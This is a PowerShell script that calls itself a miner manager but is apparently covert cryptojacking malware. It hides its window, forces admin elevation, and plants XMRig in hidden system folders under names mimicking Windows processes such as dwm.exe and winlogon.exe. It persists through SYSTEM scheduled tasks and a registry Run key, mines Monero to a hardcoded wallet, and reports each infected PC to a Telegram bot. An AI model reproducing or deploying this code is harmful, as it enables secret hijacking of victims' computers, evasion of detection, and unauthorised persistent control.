# Universal Miner Manager - Enhanced Single Instance with Auto-Restart
# Handles all versions (V1, V6, Beast Mode) with intelligent system adaptation
# Ensures reliable startup across all systems while maintaining performance
# Enhanced with single-instance enforcement and auto-restart functionality

param(
    [switch]$Install,
    [switch]$Start,
    [switch]$Monitor,
    [switch]$BeastMode,
    [switch]$V1Mode,
    [string]$TelegramToken = "7895971971:AAFLygxcPbKIv31iwsbkB2YDMj-12e7_YSE",
    [string]$ChatID = "8112985977"
)

# Hide PowerShell window completely
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

$ErrorActionPreference = "SilentlyContinue"

# Global Configuration
$GlobalConfig = @{
    Pool = "gulf.moneroocean.stream:10128"
    Wallet = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
    SourcePath = "$PSScriptRoot\miner_src"
    MutexName = "Global\UniversalXMRigMutex"
    SingleInstanceMutex = "Global\StealthMinerSingleInstance"
    
    # Primary deployment locations
    Locations = @(
        "C:\ProgramData\Microsoft\Windows\WindowsUpdate",
        "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv", 
        "C:\ProgramData\Microsoft\Network\Downloader",
        "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\.cache"
    )
    
    # V1 compatibility location
    V1Location = "C:\ProgramData\WindowsUpdater"
    
    # Stealth process names
    StealthProcesses = @("audiodg.exe", "AudioSrv.exe", "dwm.exe", "winlogon.exe")
}

function Write-UniversalLog {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "[$timestamp] [$Level] $Message"
    try {
        $logEntry | Out-File -FilePath "$env:TEMP\universal_miner.log" -Append -Encoding UTF8
    } catch { }
}

function Test-AdminPrivileges {
    try {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

function Request-AdminPrivileges {
    if (-not (Test-AdminPrivileges)) {
        Write-UniversalLog "Requesting admin privileges..."
        try {
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`" $($MyInvocation.BoundParameters.Keys | ForEach-Object { "-$_ $($MyInvocation.BoundParameters[$_])" } -join ' ')" -Verb RunAs
            exit
        } catch {
            Write-UniversalLog "Failed to elevate privileges" "ERROR"
            return $false
        }
    }
    return $true
}

function Test-SingleInstanceLock {
    try {
        $mutex = [System.Threading.Mutex]::new($false, $GlobalConfig.SingleInstanceMutex)
        if ($mutex.WaitOne(100)) {
            Write-UniversalLog "Single instance lock acquired"
            return @{ HasLock = $true; Mutex = $mutex }
        } else {
            Write-UniversalLog "Another instance is managing miners - exiting"
            return @{ HasLock = $false; Mutex = $null }
        }
    } catch {
        Write-UniversalLog "Mutex error: $($_.Exception.Message)" "ERROR"
        return @{ HasLock = $false; Mutex = $null }
    }
}

function Get-SystemCapabilities {
    $cpu = Get-WmiObject Win32_Processor
    $memory = Get-WmiObject Win32_ComputerSystem
    
    $totalRAM = [math]::Round($memory.TotalPhysicalMemory / 1GB, 2)
    $cpuCores = $cpu.NumberOfCores
    $cpuThreads = $cpu.NumberOfLogicalProcessors
    
    Write-UniversalLog "System detected: $cpuCores cores, $cpuThreads threads, ${totalRAM}GB RAM"
    
    # Calculate optimal settings based on hardware (optimized for i5-14400)
    $maxThreads = if ($cpuCores -eq 10 -and $cpuThreads -eq 16) { 14 } else { [math]::Min($cpuThreads - 2, [math]::Max(1, $cpuThreads * 0.85)) }
    $maxCpuUsage = if ($totalRAM -ge 16) { 80 } else { 75 }
    $priority = if ($totalRAM -ge 16 -and $cpuCores -ge 6) { 3 } else { 2 }
    
    return @{
        MaxThreads = [int]$maxThreads
        MaxCpuUsage = $maxCpuUsage
        Priority = $priority
        SupportsHugePages = ($totalRAM -ge 8)
        OptimalConfig = if ($cpuCores -ge 8 -and $totalRAM -ge 16) { "high" } else { "medium" }
    }
}

function Get-AllMinerProcesses {
    # Check both regular xmrig and stealth processes
    $allProcesses = @()
    
    # Regular xmrig processes
    $xmrigProcesses = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
    $allProcesses += $xmrigProcesses
    
    # Stealth processes 
    foreach ($stealthName in $GlobalConfig.StealthProcesses) {
        $processName = $stealthName.Replace(".exe", "")
        $stealthProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
        foreach ($proc in $stealthProcesses) {
            # Verify it's actually our mining process by checking command line or working directory
            try {
                $procInfo = Get-WmiObject Win32_Process | Where-Object { $_.ProcessId -eq $proc.Id }
                if ($procInfo.CommandLine -match "config\.json|--algo=rx|--coin=monero") {
                    $allProcesses += $proc
                }
            } catch { }
        }
    }
    
    return $allProcesses
}

function Stop-AllMinerProcesses {
    Write-UniversalLog "Stopping all miner processes (including stealth)..."
    
    $allMiners = Get-AllMinerProcesses
    
    foreach ($proc in $allMiners) {
        try {
            Write-UniversalLog "Terminating miner process: $($proc.ProcessName) (PID: $($proc.Id))"
            $proc.CloseMainWindow()
            if (-not $proc.WaitForExit(3000)) {
                $proc | Stop-Process -Force
            }
        } catch {
            Write-UniversalLog "Failed to terminate PID: $($proc.Id)" "WARN"
        }
    }
    
    # Force kill any remaining instances
    Start-Sleep -Seconds 2
    taskkill /f /im xmrig.exe 2>&1 | Out-Null
    foreach ($stealthName in $GlobalConfig.StealthProcesses) {
        $processName = $stealthName.Replace(".exe", "")
        taskkill /f /im $processName 2>&1 | Out-Null
    }
    
    Write-UniversalLog "All miner processes terminated"
}

function New-OptimizedConfig {
    param([string]$ConfigPath, [hashtable]$SystemCaps)
    
    $config = @{
        api = @{
            id = $null
            "worker-id" = "$env:COMPUTERNAME-stealth"
        }
        http = @{
            enabled = $true
            host = "127.0.0.1"
            port = 16000
            "access-token" = $null
            restricted = $true
        }
        autosave = $true
        background = $true
        colors = $false
        title = $false
        randomx = @{
            init = -1
            "init-avx2" = -1
            mode = "fast"
            "1gb-pages" = $SystemCaps.SupportsHugePages
            rdmsr = $true
            wrmsr = $true
            cache_qos = $true
            numa = $true
            scratchpad_prefetch_mode = 1
        }
        cpu = @{
            enabled = $true
            "huge-pages" = $SystemCaps.SupportsHugePages
            "huge-pages-jit" = $SystemCaps.SupportsHugePages
            "hw-aes" = $null
            priority = $SystemCaps.Priority
            "memory-pool" = $true
            yield = $true
            "max-threads-hint" = $SystemCaps.MaxThreads
            asm = $true
            "argon2-impl" = $null
            "astrobwt-max-size" = 550
            "astrobwt-avx2" = $false
        }
        opencl = @{ enabled = $false }
        cuda = @{ enabled = $false }
        "donate-level" = 0
        "log-file" = "xmrig.log"
        pools = @(@{
            algo = "rx/0"
            coin = "monero"
            url = $GlobalConfig.Pool
            user = $GlobalConfig.Wallet
            pass = "$env:COMPUTERNAME-stealth"
            "rig-id" = $env:COMPUTERNAME
            nicehash = $false
            keepalive = $true
            enabled = $true
            tls = $false
            daemon = $false
        })
        "print-time" = 60
        "health-print-time" = 60
        watch = $true
        "pause-on-battery" = $false
        "pause-on-active" = $false
    }
    
    # Save optimized config
    $config | ConvertTo-Json -Depth 10 | Set-Content -Path $ConfigPath -Encoding UTF8
    Write-UniversalLog "Created optimized config: $ConfigPath"
}

function Find-BestMinerLocation {
    # Check all locations for valid miner installation
    foreach ($location in $GlobalConfig.Locations + @($GlobalConfig.V1Location)) {
        $xmrigPath = Join-Path $location "xmrig.exe"
        $configPath = Join-Path $location "config.json"
        
        if ((Test-Path $xmrigPath) -and (Test-Path $configPath)) {
            Write-UniversalLog "Found valid miner at: $location"
            return @{
                ExePath = $xmrigPath
                ConfigPath = $configPath
                Location = $location
            }
        }
    }
    
    # Check stealth locations with stealth process names
    for ($i = 0; $i -lt $GlobalConfig.Locations.Count; $i++) {
        $location = $GlobalConfig.Locations[$i]
        $stealthName = $GlobalConfig.StealthProcesses[$i]
        $stealthPath = Join-Path $location $stealthName
        $configPath = Join-Path $location "config.json"
        
        if ((Test-Path $stealthPath) -and (Test-Path $configPath)) {
            Write-UniversalLog "Found stealth miner: $stealthName at $location"
            return @{
                ExePath = $stealthPath
                ConfigPath = $configPath
                Location = $location
                IsStealthProcess = $true
                ProcessName = $stealthName
            }
        }
    }
    
    # If no installation found, try source directory
    $sourceMiner = Join-Path $GlobalConfig.SourcePath "xmrig.exe"
    if (Test-Path $sourceMiner) {
        Write-UniversalLog "Using source miner: $sourceMiner"
        return @{
            ExePath = $sourceMiner
            ConfigPath = "$PSScriptRoot\config.json"
            Location = $GlobalConfig.SourcePath
        }
    }
    
    return $null
}

function Start-OptimizedMiner {
    param([hashtable]$MinerInfo, [hashtable]$SystemCaps)
    
    Write-UniversalLog "Starting optimized miner from: $($MinerInfo.Location)"
    
    try {
        # Create process with optimal settings and FULL PRIORITY
        $processInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processInfo.FileName = $MinerInfo.ExePath
        $processInfo.Arguments = "--config=`"$($MinerInfo.ConfigPath)`" --threads=$($SystemCaps.MaxThreads) --max-cpu-usage=$($SystemCaps.MaxCpuUsage) --cpu-priority=4"
        $processInfo.UseShellExecute = $false
        $processInfo.CreateNoWindow = $true
        $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        $process = [System.Diagnostics.Process]::Start($processInfo)
        
        if ($process) {
            # Set FULL PRIORITY for maximum performance
            Start-Sleep -Seconds 2
            try {
                $process.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
                
                # Set CPU affinity to use most cores efficiently
                $totalCores = [Environment]::ProcessorCount
                $useCores = [math]::Max(1, [math]::Min($totalCores - 1, $SystemCaps.MaxThreads))
                $affinityMask = (1 -shl $useCores) - 1
                $process.ProcessorAffinity = [IntPtr]$affinityMask
                
                Write-UniversalLog "Set HIGH priority and optimal affinity"
                
            } catch {
                Write-UniversalLog "Could not set process priority/affinity" "WARN"
            }
            
            Write-UniversalLog "Miner started successfully - PID: $($process.Id), Threads: $($SystemCaps.MaxThreads), Priority: HIGH"
            return $true
        } else {
            Write-UniversalLog "Failed to start miner process" "ERROR"
            return $false
        }
        
    } catch {
        Write-UniversalLog "Exception starting miner: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Send-TelegramMessage {
    param([string]$Message)
    try {
        $uri = "https://api.telegram.org/bot$TelegramToken/sendMessage"
        $body = @{
            chat_id = $ChatID
            text = $Message
            parse_mode = "HTML"
        }
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -TimeoutSec 10 | Out-Null
        return $true
    } catch {
        Write-UniversalLog "Telegram send failed: $($_.Exception.Message)" "WARN"
        return $false
    }
}

function Install-UniversalMiner {
    Write-UniversalLog "Installing universal miner system..."
    
    # Ensure admin privileges
    if (-not (Request-AdminPrivileges)) {
        return $false
    }
    
    $systemCaps = Get-SystemCapabilities
    
    # Deploy to all locations with fallback compatibility
    foreach ($location in $GlobalConfig.Locations + @($GlobalConfig.V1Location)) {
        try {
            if (-not (Test-Path $location)) {
                New-Item -Path $location -ItemType Directory -Force | Out-Null
            }
            
            # Copy miner files
            if (Test-Path $GlobalConfig.SourcePath) {
                Copy-Item -Path "$($GlobalConfig.SourcePath)\*" -Destination $location -Recurse -Force
                Write-UniversalLog "Deployed to: $location"
            }
            
            # Create optimized config for each location
            $configPath = Join-Path $location "config.json"
            New-OptimizedConfig -ConfigPath $configPath -SystemCaps $systemCaps
            
            # Set hidden attributes
            attrib +h +s $location 2>&1 | Out-Null
            
        } catch {
            Write-UniversalLog "Failed to deploy to $location : $($_.Exception.Message)" "ERROR"
        }
    }
    
    # Create universal startup script
    $startupScript = @"
@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '$PSCommandPath' -Start"
"@
    
    $startupScript | Set-Content -Path "C:\ProgramData\Microsoft\Windows\WindowsUpdate\universal_start.bat"
    
    # Create VBS launcher for complete invisibility
    $vbsLauncher = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& '$PSCommandPath' -Monitor""", 0, False
"@
    
    $vbsLauncher | Set-Content -Path "C:\ProgramData\Microsoft\Windows\WindowsUpdate\universal_monitor.vbs"
    
    # Create scheduled tasks with multiple redundancy
    $taskNames = @("WindowsAudioService", "SystemHostAudio", "UniversalMiner")
    foreach ($taskName in $taskNames) {
        schtasks /create /tn $taskName /tr "wscript.exe `"C:\ProgramData\Microsoft\Windows\WindowsUpdate\universal_monitor.vbs`"" /sc onstart /ru SYSTEM /rl HIGHEST /f 2>&1 | Out-Null
    }
    
    # Registry startup entries
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "UniversalAudioService" /t REG_SZ /d "wscript.exe `"C:\ProgramData\Microsoft\Windows\WindowsUpdate\universal_monitor.vbs`"" /f 2>&1 | Out-Null
    
    Write-UniversalLog "Universal miner installation completed"
    return $true
}

function Set-SingleInstance {
    Write-UniversalLog "Enforcing single miner instance..."
    
    $allMiners = Get-AllMinerProcesses
    
    if ($allMiners.Count -gt 1) {
        Write-UniversalLog "Multiple miners detected ($($allMiners.Count)) - keeping best performer"
        
        # Sort by performance metrics (working set as proxy for performance)
        $bestMiner = $allMiners | Sort-Object WorkingSet -Descending | Select-Object -First 1
        
        # Terminate all others
        $othersTerminated = 0
        foreach ($miner in $allMiners) {
            if ($miner.Id -ne $bestMiner.Id) {
                try {
                    $miner | Stop-Process -Force
                    $othersTerminated++
                    Write-UniversalLog "Terminated duplicate miner PID: $($miner.Id)"
                } catch {
                    Write-UniversalLog "Failed to terminate PID: $($miner.Id)" "ERROR"
                }
            }
        }
        
        Write-UniversalLog "Single instance enforced - kept PID: $($bestMiner.Id), terminated: $othersTerminated"
        return $bestMiner
        
    } elseif ($allMiners.Count -eq 1) {
        Write-UniversalLog "Single instance already running - PID: $($allMiners[0].Id)"
        return $allMiners[0]
        
    } else {
        Write-UniversalLog "No miner instances detected"
        return $null
    }
}

function Start-UniversalMiner {
    Write-UniversalLog "Starting universal miner with single instance enforcement..."
    
    # Acquire single instance lock
    $lockResult = Test-SingleInstanceLock
    if (-not $lockResult.HasLock) {
        return $false
    }
    
    try {
        # Get system capabilities
        $systemCaps = Get-SystemCapabilities
        
        # Enforce single instance first
        $runningMiner = Set-SingleInstance
        
        if ($runningMiner) {
            Write-UniversalLog "Miner already running optimally - PID: $($runningMiner.Id)"
            # Ensure it has full priority
            try {
                $runningMiner.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
                Write-UniversalLog "Updated existing miner to HIGH priority"
            } catch { }
            
            $message = "✅ <b>MINER ACTIVE</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Process: $($runningMiner.ProcessName)`n⚡ Priority: HIGH`n🎯 Expected: 5.5+ KH/s"
            Send-TelegramMessage -Message $message
            return $true
        }
        
        # No miner running - start new one
        Write-UniversalLog "No miner detected - starting with FULL PRIORITY"
        
        # Find best miner location
        $minerInfo = Find-BestMinerLocation
        if (-not $minerInfo) {
            Write-UniversalLog "No valid miner installation found" "ERROR"
            
            # Try to install if source exists
            if (Test-Path $GlobalConfig.SourcePath) {
                Write-UniversalLog "Attempting emergency installation..."
                Install-UniversalMiner
                $minerInfo = Find-BestMinerLocation
            }
            
            if (-not $minerInfo) {
                $message = "❌ <b>MINER ERROR</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ No valid installation found"
                Send-TelegramMessage -Message $message
                return $false
            }
        }
        
        # Ensure config is optimized for this system
        New-OptimizedConfig -ConfigPath $minerInfo.ConfigPath -SystemCaps $systemCaps
        
        # Start optimized miner with full priority
        if (Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $systemCaps) {
            $processType = if ($minerInfo.IsStealthProcess) { "STEALTH ($($minerInfo.ProcessName))" } else { "STANDARD" }
            $message = "🚀 <b>MINER STARTED</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Type: $processType`n⚡ Priority: HIGH`n🧵 Threads: $($systemCaps.MaxThreads)`n🎯 Expected: 5.5+ KH/s"
            Send-TelegramMessage -Message $message
            
            # Start monitoring
            Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult $lockResult
            return $true
        } else {
            $message = "❌ <b>START FAILED</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ Could not start miner process"
            Send-TelegramMessage -Message $message
            return $false
        }
        
    } finally {
        # Release mutex if we still have it
        if ($lockResult.Mutex) { 
            $lockResult.Mutex.ReleaseMutex() 
            $lockResult.Mutex.Dispose()
        }
    }
}

function Start-AutoRestartMonitoring {
    param([hashtable]$SystemCaps, [hashtable]$LockResult)
    
    Write-UniversalLog "Starting auto-restart monitoring loop..."
    $checkInterval = 15  # Check every 15 seconds
    $lastHealthCheck = Get-Date
    $healthCheckInterval = 300  # 5 minutes
    
    # Release the initial lock since we're starting monitoring
    if ($LockResult.Mutex) { 
        $LockResult.Mutex.ReleaseMutex() 
        $LockResult.Mutex.Dispose()
    }
    
    while ($true) {
        try {
            # Acquire lock for this check
            $monitorLock = Test-SingleInstanceLock
            if (-not $monitorLock.HasLock) {
                Write-UniversalLog "Another monitor instance detected - exiting this monitor"
                break
            }
            
            # Check for miners
            $runningMiner = Set-SingleInstance
            
            if (-not $runningMiner) {
                Write-UniversalLog "NO MINER DETECTED - AUTO-STARTING WITH FULL PRIORITY" "WARNING"
                
                # Find miner and start it
                $minerInfo = Find-BestMinerLocation
                if ($minerInfo) {
                    New-OptimizedConfig -ConfigPath $minerInfo.ConfigPath -SystemCaps $SystemCaps
                    if (Start-OptimizedMiner -MinerInfo $minerInfo -SystemCaps $SystemCaps) {
                        $processType = if ($minerInfo.IsStealthProcess) { "STEALTH ($($minerInfo.ProcessName))" } else { "STANDARD" }
                        $message = "🔄 <b>AUTO-RESTART</b>`n💻 PC: $env:COMPUTERNAME`n🔥 Type: $processType`n⚡ Priority: HIGH`n⏰ Time: $(Get-Date -Format 'HH:mm')"
                        Send-TelegramMessage -Message $message
                        Write-UniversalLog "Auto-restart successful"
                    } else {
                        Write-UniversalLog "Auto-restart failed" "ERROR"
                    }
                }
            }
            
            # Periodic health check and optimization
            if ((Get-Date).Subtract($lastHealthCheck).TotalSeconds -gt $healthCheckInterval) {
                $lastHealthCheck = Get-Date
                
                if ($runningMiner) {
                    # Ensure miner maintains high priority
                    try {
                        if ($runningMiner.PriorityClass -ne [System.Diagnostics.ProcessPriorityClass]::High) {
                            $runningMiner.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::High
                            Write-UniversalLog "Restored HIGH priority to miner"
                        }
                    } catch { }
                    
                    # Get hashrate via API if available
                    try {
                        $api = Invoke-RestMethod -Uri "http://127.0.0.1:16000/1/summary" -TimeoutSec 3
                        if ($api.hashrate.total -and $api.hashrate.total[0] -gt 0) {
                            $hashrate = [math]::Round($api.hashrate.total[0], 0)
                            Write-UniversalLog "Current hashrate: $hashrate H/s"
                        }
                    } catch { }
                }
            }
            
            # Release monitor lock
            if ($monitorLock.Mutex) { 
                $monitorLock.Mutex.ReleaseMutex() 
                $monitorLock.Mutex.Dispose()
            }
            
        } catch {
            Write-UniversalLog "Monitoring error: $($_.Exception.Message)" "ERROR"
        }
        
        Start-Sleep -Seconds $checkInterval
    }
}

function Connect-ToBeastMode {
    Write-UniversalLog "Attempting to connect V1 to Beast Mode infrastructure..."
    
    # Check if Beast Mode C&C is running
    $beastCC = Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object { 
        $_.MainWindowTitle -like "*command_control*" -or 
        $_.CommandLine -like "*command_control.ps1*" 
    }
    
    if ($beastCC) {
        Write-UniversalLog "Beast Mode C&C detected - integrating V1"
        
        # Copy V1 config to Beast Mode location for unified management
        $v1Config = Join-Path $GlobalConfig.V1Location "config.json"
        $beastConfig = Join-Path $GlobalConfig.Locations[0] "config.json"
        
        if ((Test-Path $v1Config) -and (Test-Path $GlobalConfig.Locations[0])) {
            Copy-Item -Path $v1Config -Destination $beastConfig -Force
            Write-UniversalLog "V1 config integrated with Beast Mode"
            return $true
        }
    }
    
    return $false
}

# Main execution logic
Write-UniversalLog "Universal Miner Manager started - PID: $PID"

if ($Install) {
    Install-UniversalMiner
} elseif ($Start) {
    # Handle V1 to Beast Mode connection if needed
    if ($V1Mode -and $BeastMode) {
        Connect-ToBeastMode
    }
    
    Start-UniversalMiner
} elseif ($Monitor) {
    $systemCaps = Get-SystemCapabilities
    Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult @{Mutex = $null}
} else {
    # Default behavior - ensure single miner is running with auto-restart
    $systemCaps = Get-SystemCapabilities
    
    $runningMiner = Enforce-SingleInstance
    if (-not $runningMiner) {
        Write-UniversalLog "No miner detected - starting with auto-restart monitoring"
        Start-UniversalMiner
    } else {
        Write-UniversalLog "Miner already running - starting auto-restart monitoring"
        Start-AutoRestartMonitoring -SystemCaps $systemCaps -LockResult @{Mutex = $null}
    }
}